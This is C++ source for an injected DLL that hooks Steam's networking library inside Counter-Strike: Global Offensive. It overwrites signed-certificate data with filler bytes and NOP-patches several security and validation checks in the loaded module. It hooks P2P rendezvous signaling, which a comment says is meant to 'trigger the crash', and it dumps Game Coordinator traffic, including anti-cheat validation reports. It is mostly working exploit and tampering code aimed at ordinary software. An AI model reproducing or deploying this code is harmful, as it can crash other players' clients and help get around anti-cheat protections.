    bool empty() const { return m_size == 0; }
    const char* c_str() { return large_string_engaged() ? get_large_string() : reinterpret_cast<const char*>(this); }
}; //size 24 bytes

// E8 ? ? ? ? 83 4D AC 10
void* oCopyCert = nullptr;
int __fastcall hk_Copy_Cert(CMsgSteamDatagramCertificateSigned* _this,void*, void* a2)
{
    static int(__thiscall * copy_cert_google_proto_raw)(CMsgSteamDatagramCertificateSigned*, void*) = (int(__thiscall * )(CMsgSteamDatagramCertificateSigned*, void*))MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 8B 55 08 42") + 1));
    static CMsgSteamDatagramCertificateSigned msg;
    static bool bOnce = [&]() -> bool
    {

        return true;
    }();
        

    int result = 0; // eax
    if (a2 != _this)
    {
        (*(void(__thiscall**)(void*))(*(DWORD*)_this + 12))(_this);

        // E8 ? ? ? ? 8B 55 08 42
        auto ret = copy_cert_google_proto_raw(_this, a2);
        static char buffer[8192];
        memset(buffer, 'ннн', sizeof(buffer));
        buffer[sizeof(buffer) - 1] = 0;
#if 0
        msg.set_ca_key_id(INT64_MAX);
        msg.set_cert(buffer);
        msg.set_ca_signature("LOL FUCK YOU");
        msg.set_private_key_data("LOL GET FUCKED FUCKO");
#endif

        static DWORD* (__thiscall * CopyStringSteam)(void*, int*, int) = (DWORD * (__thiscall*)(void*, int*, int))MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 89 75 F0") + 1));

        
        void* pStr = init_std_release_string();
        CopyStringSteam(pStr, (int*)buffer, sizeof(buffer));
        ((int*)_this)[9] = (int)pStr;

#if 1
        DWORD* std_string_obj = ((DWORD**)_this)[9];
        DWORD strSize = std_string_obj[4];


        int v5 = std_string_obj[5];
        char* buf = (char*)std_string_obj;//(char*)*std_string_obj;
        int str_size = std_string_obj[4];
        if (v5 >= 0x10)
            buf = (char*)*std_string_obj;

        for (int i = 0; i < (str_size + 1); i++)
            *(buf + i) = 'A';
#endif

        //_this->set_cert(buffer);



        return ret;
    }
    return result;
}


void* oGetLocalVirtualPortPtr = nullptr;
int* __fastcall hk_GetLocalVirtualPortPtr(int* _this)
{
    static void* pRetAddress = MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "8D 4E 2C 8B 00");
    static int nPort = 0;

    if (_ReturnAddress() != pRetAddress)
        return reinterpret_cast<decltype(&hk_GetLocalVirtualPortPtr)>(oGetLocalVirtualPortPtr)(_this);

    nPort++;

    int nVal = -1;// (nPort % 2) ? 0 : 1;//-1 : k_nVirtualPort_Messages;

    return &nVal;
}
#include <string>
void* oReceivedP2PCustomSignal = nullptr;
bool __fastcall ReceivedP2PCustomSignal(ISteamNetworkingSockets* _this,
    void* edx, const void* pMsg, int cbMsg, ISteamNetworkingSignalingRecvContext* pContext)
{
    CMsgSteamNetworkingP2PRendezvous msg;
    if (!msg.ParseFromArray(pMsg, cbMsg))
    {
        printf("P2P signal failed protobuf parse\n");
        return false;
    }
    else
    {
        if (msg.has_from_connection_id() && (g_conn.m_ConnID == 0))
            g_conn.m_ConnID = msg.from_connection_id();

        //pContext->
        //g_pSteamNetworkingSockets->ConnectP2P()
    }

    std::string callstack;
    MemoryTools::GetDebugCallStackString(&callstack);
    printf("%s", callstack.c_str());

    return reinterpret_cast<decltype(&ReceivedP2PCustomSignal)>(oGetLocalVirtualPortPtr)(_this,edx,pMsg,cbMsg, pContext);
}

// 55 8B EC 6A FF 68 ? ? ? ? 64 A1 ? ? ? ? 50 64 89 25 ? ? ? ? 83 EC 34 53 8B 5D 08 
class CSteamNetworkConnectionBase;
void* oThink = nullptr;
void __fastcall hk_Think(CSteamNetworkConnectionBase* _this, void* edx, SteamNetworkingMicroseconds usecNow)
{

    return reinterpret_cast<decltype(&hk_Think)>(oThink)(_this, edx, 0);
}


void dump_proto_message(uint32_t unMsgType, void* pubDest, uint32_t pcubMsgSize, int nSent = true);
int __fastcall hk_RetrieveMessage(void* ecx, void* edx, uint32_t* punMsgType, void* pubDest, uint32_t cubDest, uint32_t* pcubMsgSize);
decltype(&hk_RetrieveMessage) oRMessage = nullptr;
int __fastcall hk_RetrieveMessage(void* ecx, void* edx, uint32_t* punMsgType, void* pubDest, uint32_t cubDest, uint32_t* pcubMsgSize)
{
    printf("------- Recieved : \n");
    dump_proto_message(*punMsgType, pubDest, *pcubMsgSize, false);
    return oRMessage(ecx, edx, punMsgType, pubDest, cubDest, pcubMsgSize);
}

int __fastcall hk_SendMessage(void* ecx, void* edx, uint32_t unMsgType, const void* pubData, uint32_t cubData);
decltype(&hk_SendMessage) oSendMessage = nullptr;
int __fastcall hk_SendMessage(void* ecx, void* edx, uint32_t unMsgType, const void* pubData, uint32_t cubData)
{
    printf("------- Sent : \n");
    dump_proto_message(unMsgType, (void*)pubData, cubData);
    return oSendMessage(ecx, edx, unMsgType, pubData, cubData);
}

void Initialize()
{

    MH_Initialize();
#if 0
    // Aquire Needed Functions For Adding Additional Reliable Messages
    {

    }

    {

    }
    {

    }

    // Get Address of Set Renezvous 

    // Hook Function so we can increase the size of CMsgSteamNetworkingP2PRendezvous to trigger the crash
    MH_CreateHook(SetRendezvousCommonFieldsAndSendSignalAddr, &SetRendezvousCommonFieldsAndSendSignal, (void**)&oSetRendezvousCommonFieldsAndSendSignal);
#else 

    std::uintptr_t addr = (std::uintptr_t)FindPattern("steamnetworkingsockets.dll", "\xE8????\x83\xC6\x28\x89\x75\xEC") + 1;
    ReliableMessageConstructor = (ReliableMessageConstructorFunc_t)(addr + 4 + *(std::uintptr_t*)addr);

    addr = (std::uintptr_t)FindPattern("steamnetworkingsockets.dll", "\xE8????\x6A\x5C") + 1;
    AddReliableMessage = (AddReliableMessageFunc_t)(addr + 4 + *(std::uintptr_t*)addr);

    addr = (std::uintptr_t)FindPattern("steamnetworkingsockets.dll", "\xE8????\x83\xC7\x38") + 1;
    SteamMalloc = relativeToAbsolute<SteamMallocFunc_t>(addr);

    std::uintptr_t SetRendezvousCommonFieldsAndSendSignalCallAddr = (std::uintptr_t)FindPattern("steamnetworkingsockets.dll", "\xE8????\x84\xC0\x74\x53\x39\xBE????") + 1;
    void* SetRendezvousCommonFieldsAndSendSignalAddr = relativeToAbsolute<void*>(SetRendezvousCommonFieldsAndSendSignalCallAddr);
    MH_CreateHook(SetRendezvousCommonFieldsAndSendSignalAddr, &SetRendezvousCommonFieldsAndSendSignal, (void**)&oSetRendezvousCommonFieldsAndSendSignal);
    void* pConDisconnectMsg = nullptr;
    //void* pConDisconnectMsg = MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 8B 45 E0 8B CE") + 1));
    //MH_CreateHook(pConDisconnectMsg, &hk_CMsgSteamDatagramConnectionClosed_Con_1, &pOCMsgSteamDatagramConnectionClosed_Con_1);

   // pConDisconnectMsg = MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E9 ? ? ? ? 8B 45 F0 83 E0 40") + 1));
    //MH_CreateHook(pConDisconnectMsg, &hk_CMsgSteamDatagramConnectionClosed_Con_2, &pOCMsgSteamDatagramConnectionClosed_Con_2);

    //pConDisconnectMsg = MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "55 8B EC 56 8B F1 C7 06 ? ? ? ? E8 ? ? ? ? 8D 4E 04 E8 ? ? ? ? 8B CE E8 ? ? ? ? F6 45 08 01 74 0B 6A 60");
    //MH_CreateHook(pConDisconnectMsg, &hk_CMsgSteamDatagramConnectionClosed_Con_3, &pOCMsgSteamDatagramConnectionClosed_Con_3);

    //pConDisconnectMsg = MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "55 8B EC 6A FF 68 ? ? ? ? 64 A1 ? ? ? ? 50 64 89 25 ? ? ? ? 83 EC 34 53 8B 5D 08");
    //MH_CreateHook(pConDisconnectMsg, &hk_Think, &oThink);

    pConDisconnectMsg = MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "55 8B EC 53 56 57 8B F9 6A 00 68 ? ? ? ? 68 ? ? ? ? 8B 4F 18 E8 ? ? ? ? 8B 5D 08");
    MH_CreateHook(pConDisconnectMsg, &hk_APIGetDetailedConnectionStatus, &oAPIGetDetailedConnectionStatus);

    pConDisconnectMsg = MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "55 8B EC 6A FF 68 ? ? ? ? 64 A1 ? ? ? ? 50 64 89 25 ? ? ? ? 83 EC 68");
    MH_CreateHook(pConDisconnectMsg, &ReceivedP2PCustomSignal, &oReceivedP2PCustomSignal);

    pConDisconnectMsg = MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 68 ? ? ? ? FF 75 0C") + 1));
    MH_CreateHook(pConDisconnectMsg, &hk_CMsgSteamNetworkingP2PRendezvous_ConnectionClosed_set_debug, &oCMsgSteamNetworkingP2PRendezvous_ConnectionClosed_set_debug);

    // E8 ? ? ? ? 83 4D AC 10
    pConDisconnectMsg = MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 83 4D AC 10") + 1));
    MH_CreateHook(pConDisconnectMsg, &hk_Copy_Cert, &oCopyCert);



    pConDisconnectMsg = MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "55 8B EC 83 EC 10 53 8B D9 56 57 33 FF");
    MH_CreateHook(pConDisconnectMsg, &hk_GetByteSize, &oGetByteSize);
    // E8 ? ? ? ? 3B 38
    pConDisconnectMsg = MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 3B 38") + 1));
    MH_CreateHook(pConDisconnectMsg, &hk_GetLocalVirtualPortPtr, &oGetLocalVirtualPortPtr);
    //hk_PopulateRendezvousMsgWithTransportInfo


#endif

    // Get Access To Steamworks interfaces

    std::uintptr_t pSteamworksApi = reinterpret_cast<std::uintptr_t>(GetModuleHandleA("steam_api.dll"));
#define STEAM_FUNC(NAME) ((decltype(&NAME))GetProcAddress( reinterpret_cast<HMODULE>(pSteamworksApi), #NAME))
    const auto user = STEAM_FUNC(SteamAPI_GetHSteamUser)();
    const auto pipe = STEAM_FUNC(SteamAPI_GetHSteamPipe)();
    const auto steam_client = STEAM_FUNC(SteamClient)();
#undef STEAM_FUNC	



    g_pSteamNetworkingSockets = ((ISteamNetworkingSockets * (*)())GetProcAddress(GetModuleHandleA("steamnetworkingsockets.dll"), "SteamNetworkingSockets_LibV12"))();
    pUtils = (ISteamNetworkingUtils * )steam_client->GetISteamGenericInterface(user, pipe, STEAMNETWORKINGUTILS_INTERFACE_VERSION);
    //ISteamGameCoo
    ISteamGameCoordinator* pCoord = (ISteamGameCoordinator*)steam_client->GetISteamGenericInterface(user, pipe, STEAMGAMECOORDINATOR_INTERFACE_VERSION);


    auto pSendMsg = MemoryTools::GetVTableFuncAddress(pCoord, 0);
    MemoryTools::HookFunctionx86(pSendMsg, &hk_SendMessage, (void**)&oSendMessage);

    auto pRMsg = MemoryTools::GetVTableFuncAddress(pCoord, 2);
    MemoryTools::HookFunctionx86(pRMsg, &hk_RetrieveMessage, (void**)&oRMessage);

    int nVtableCount = MemoryTools::CalculateVmtLength((void*)((DWORD**)pCoord)[1]);
    std::string pStrings[1024];


    MemoryTools::CreateVTableSigsx86((void*)(((DWORD**)pCoord)[1]), nVtableCount, pStrings, 100);

    for (int i = 0; i < nVtableCount; i++)
        printf("%s\n", pStrings[i].c_str());




    //pCoord->

    pUtils->SetDebugOutputFunction(k_ESteamNetworkingSocketsDebugOutputType_Everything, &output_steam_debug);
    
    
    static auto write_nops_to_kill_jump = [](unsigned char* pAddr, int nNops) {

        if (!pAddr)
            __debugbreak();

        DWORD oldProtect;
        VirtualProtect(pAddr, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
        for (int i = 0; i < nNops; i++)
            *pAddr++ = 0x90;
    };

#if 1
    {
        unsigned char* pCheckIfAddRequest = (unsigned char* )MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "0F 85 ? ? ? ? 8B 7B 30");
        write_nops_to_kill_jump(pCheckIfAddRequest, 6);
        pCheckIfAddRequest = (unsigned char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "A8 01 0F 85 ? ? ? ? 80 BE ? ? ? ? ?");
        write_nops_to_kill_jump(pCheckIfAddRequest + 2, 6);
        pCheckIfAddRequest = (unsigned char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "83 BE ? ? ? ? ? 0F 85 ? ? ? ? 8B 4B 08");
        
        if (!pCheckIfAddRequest)
            printf("Weirdly unable to find the comparator?");

        write_nops_to_kill_jump(pCheckIfAddRequest + 7, 6);

#if 0
        pCheckIfAddRequest = (unsigned char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "7E 4B 83 FF FF");
        write_nops_to_kill_jump(pCheckIfAddRequest, 2);
        pCheckIfAddRequest = (unsigned char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "75 5C 8D 43 08");
        write_nops_to_kill_jump(pCheckIfAddRequest, 2);
#endif


        pCheckIfAddRequest = (unsigned char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "7C 0F 68 ? ? ? ? 6A 01 E8 ? ? ? ? 83 C4 08 8B 4D F4");
        DWORD oldProtect;
        VirtualProtect(pCheckIfAddRequest, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
        *pCheckIfAddRequest = 0xEB;
    }
#endif

    MH_EnableHook(MH_ALL_HOOKS);


    //CMsgSteamDatagramP2PRoutes 
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    OutputDebugStringA("On DLL Injection!\n");
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        AllocConsole();
        FILE* fDummy;
        freopen_s(&fDummy, "CONOUT$", "w", stdout);
        freopen_s(&fDummy, "CONOUT$", "w", stderr);
        freopen_s(&fDummy, "CONIN$", "r", stdin);
        printf("Initializing Hooks...");
        Initialize();
        printf("Ok\n");
        printf("Starting Main Thread\n");
        // Start Main Thread 
        _beginthreadex(0, 0, MainThread, 0, NULL, 0);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



// game_coordinator shit

#include <mutex>
#include <fstream>
template <class T>
std::string DumpProtobufMessage(char* pData, size_t nDataSize)
{
    static std::mutex _Dump_Lock;
    std::lock_guard<std::mutex> _(_Dump_Lock);

    std::ofstream out("dumped_protobufs.txt", std::ios::app | std::ios::out);

    T ProtoBuf;
    ProtoBuf.ParseFromArray(pData, nDataSize);
    std::string DebugStr = ProtoBuf.DebugString();
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    int k = 10;
    SetConsoleTextAttribute(hConsole, k);
    for (int nCurrentPos = 0; nCurrentPos < DebugStr.size(); )
    {
        int nextStepSize = min(DebugStr.size() - nCurrentPos, 200);
        std::string debugsubstring = DebugStr.substr(nCurrentPos, nextStepSize);
        printf("%s\n", debugsubstring.c_str());
        out.write(debugsubstring.c_str(), debugsubstring.size());
        out.flush();
        nCurrentPos += nextStepSize;
    }
    out.close();
    SetConsoleTextAttribute(hConsole, 15);
    return "ClientValidationPacket";
}


void dump_proto_message(uint32_t unMsgType, void* pubDest, uint32_t pcubMsgSize, int nSent /*= true*/)
{
    unMsgType = unMsgType & 0x7FFFFFFF;

    //HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    //int k = 10;
    //SetConsoleTextAttribute(hConsole, k);
    //printf("------------ Protobuf Message Dump ------------- \n     Type : %s (%d)\n%s\n", );
    //SetConsoleTextAttribute(hConsole, 15);


    if ((pcubMsgSize - 8) <= 0)
    {
        printf("Empty Message (%d)\n", unMsgType);
        return;
    }

    switch (unMsgType)
    {
    case k_EMsgGCCStrike15_v2_ServerVarValueNotificationInfo:
        printf("CMsgGCCStrike15_v2_ServerVarValueNotificationInfo\n");
        DumpProtobufMessage<CMsgGCCStrike15_v2_ServerVarValueNotificationInfo>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    case k_EMsgGCCStrike15_v2_ClientVarValueNotificationInfo:
        printf("CMsgGCCStrike15_v2_ClientVarValueNotificationInfo\n");
        DumpProtobufMessage<CMsgGCCStrike15_v2_ClientVarValueNotificationInfo>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    case k_EMsgGCCStrike15_v2_ClientReportValidation:
    {

        CMsgGCCStrike15_v2_ClientReportValidation valid;
        valid.ParsePartialFromArray((char*)pubDest + 8, (size_t)pcubMsgSize - 8);

        printf("CMsgGCCStrike15_v2_ClientReportValidation\n");
        DumpProtobufMessage<CMsgGCCStrike15_v2_ClientReportValidation>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);


        std::ofstream client_validate_packet("client_report_validate.dump", std::ios::out | std::ios::binary);
        client_validate_packet.write(
            (const char*)pubDest, pcubMsgSize);
        client_validate_packet.flush();
        client_validate_packet.close();


        std::ofstream client_validate_packet_text("client_validate_file_report.text", std::ios::out);
        client_validate_packet_text.write(
            valid.file_report().data(), valid.file_report().size());
        client_validate_packet_text.flush();
        client_validate_packet_text.close();

        std::ofstream client_validate_packet_debug("client_validate_debug_all_fields.text", std::ios::out );
        client_validate_packet_debug.write(
            valid.DebugString().c_str(), valid.DebugString().size());
        client_validate_packet_debug.flush();
        client_validate_packet_debug.close();

        char buf[8192];
        int nSize = 0;
        static bool(__cdecl * BSecureAllowed)(BYTE * ste, int size, int a3) = ((decltype(BSecureAllowed))GetProcAddress(GetModuleHandleA("csgo.exe"), "BSecureAllowed"));
        BSecureAllowed((BYTE*)buf, sizeof(buf), false);

        std::ofstream b_secure_send_all("b_secure_send_small.txt", std::ios::binary);
        b_secure_send_all.write(
            buf, strlen(buf));
        b_secure_send_all.flush();
        b_secure_send_all.close();

    }
        break;
    case k_EMsgGCCStrike15_v2_GC2ClientRequestValidation:
    {
        printf("CMsgGCCStrike15_v2_GC2ClientRequestValidation\n");
        DumpProtobufMessage<CMsgGCCStrike15_v2_GC2ClientRequestValidation>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    }
    case k_EMsgGCCStrike15_v2_GC2ClientRefuseSecureMode:
        printf("CMsgGCCStrike15_v2_GC2ClientRefuseSecureMode\n");
        DumpProtobufMessage<CMsgGCCStrike15_v2_GC2ClientRefuseSecureMode>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    case k_EMsgGCCStrike15_v2_MatchmakingGC2ClientUpdate:
        printf("CMsgGCCStrike15_v2_MatchmakingGC2ClientUpdate\n");
        DumpProtobufMessage<CMsgGCCStrike15_v2_MatchmakingGC2ClientUpdate>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    case k_EMsgGCClientHello:
        printf("CMsgClientHello\n");
        DumpProtobufMessage<CMsgClientHello>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    case k_EMsgGCClientConnectionStatus:
        printf("CMsgConnectionStatus\n");
        DumpProtobufMessage<CMsgConnectionStatus>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    case k_EMsgGCClientWelcome:
    {
        printf("CMsgClientWelcome\n");
        DumpProtobufMessage<CMsgClientWelcome>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        CMsgClientWelcome welcome;
        welcome.ParsePartialFromArray((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        if (welcome.has_game_data2())
        {
            printf("CMsgGCCStrike15_v2_MatchmakingGC2ClientHello\n");
            CMsgGCCStrike15_v2_MatchmakingGC2ClientHello mmHelloMessage;
            if (mmHelloMessage.ParsePartialFromString(welcome.game_data2()))
            {
                DumpProtobufMessage<CMsgGCCStrike15_v2_MatchmakingGC2ClientHello>((char*)welcome.game_data2().c_str(), (size_t)welcome.game_data2().size());
            }


        }
        break;
    }
    case k_EGCMsgMulti:
        printf("CMsgSOMultipleObjects\n");
        DumpProtobufMessage<CMsgSOMultipleObjects>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    case k_EMsgGCCStrike15_v2_Account_RequestCoPlays:
        printf("CMsgGCCStrike15_v2_Account_RequestCoPlays\n");
        DumpProtobufMessage<CMsgGCCStrike15_v2_Account_RequestCoPlays>((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    case k_EMsgGCCStrike15_v2_MatchmakingStart:
        printf("CMsgGCCStrike15_v2_MatchmakingStart\n");
        DumpProtobufMessage<CMsgGCCStrike15_v2_MatchmakingStart >((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    case k_EMsgGCCStrike15_v2_MatchmakingStop:
        printf("CMsgGCCStrike15_v2_MatchmakingStop\n");
        DumpProtobufMessage<CMsgGCCStrike15_v2_MatchmakingStop >((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    case k_EMsgGCCStrike15_v2_MatchmakingClient2ServerPing:
        printf("CMsgGCCStrike15_v2_MatchmakingClient2ServerPing\n");
        DumpProtobufMessage<CMsgGCCStrike15_v2_MatchmakingClient2ServerPing >((char*)pubDest + 8, (size_t)pcubMsgSize - 8);
        break;
    default:
        printf("Unkn Message Type : %u\n", unMsgType);
    }





}